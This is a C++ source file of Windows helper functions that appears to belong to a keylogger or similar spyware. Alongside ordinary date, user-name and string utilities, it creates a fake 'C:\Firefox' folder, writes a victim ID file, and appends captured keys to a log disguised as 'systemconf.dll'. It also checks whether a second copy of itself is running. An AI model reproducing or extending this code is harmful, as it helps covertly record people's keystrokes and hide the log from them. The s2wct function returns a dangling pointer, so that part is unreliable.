#include <sstream> 
#include <fstream>
#include <windows.h>
#include <Lmcons.h>
#include <ctime>
#include <direct.h>
#include <tlhelp32.h>

#include "FileHandler.h"
#include "Utils.h"
    
const std::string getCurrentDateTime(bool includeHours) {
    time_t     now = time(0);
    struct tm  tstruct;
    char       buf[80];
    tstruct = *localtime(&now);
    if(includeHours)
        strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
    else
        strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);

    return buf;
}

std::string getUserName(){
    TCHAR name [ UNLEN + 1 ];
        DWORD size = UNLEN + 1;
        GetUserName( (TCHAR*)name, &size );
        std::stringstream ss;
        std::string userName;
        ss << name;
        ss >> userName;
        return userName;
}

std::wstring s2ws(const std::string& s){
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

const wchar_t* s2wct(std::string path){
    std::wstring widepath;
    for(int i = 0; i < path.length(); ++i)
        widepath += wchar_t( path[i] );

    return widepath.c_str();
}

std::string generateRandomNumber(){
    srand (time(0));
    int intRandomNumber = rand () % 10000+1;
    char charRandomNumber[6];
    itoa(intRandomNumber,charRandomNumber, 10);
    std::string stringRandomNumber = std::string(charRandomNumber);

    return stringRandomNumber;
}

void storeKey(std::string key){
    std::ofstream store("C:\\Firefox\\systemconf.dll", std::ios::app);
    store << key;
    store.close();
}

std::string createId(){
   mkdir("C:\\Firefox");
   
   std::ofstream sysid("C:\\Firefox\\sysid.dat");
   std::string id = generateRandomNumber();
   sysid << id;
   storeKey("First run!");
   return id;
}

bool isProcessRunning(const char* name){
	HANDLE SnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if(SnapShot == INVALID_HANDLE_VALUE)
		return false;
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	if( !Process32First(SnapShot, &procEntry) )
		return false;

        int processCount = 0;
	do {
		if(strcmp(procEntry.szExeFile, name) == 0 )
                    processCount++;
                if(processCount == 2) // hack to check for duplicates since this function is used only for this process
                    return true;
	} while( Process32Next( SnapShot, &procEntry ) );

	return false;
}
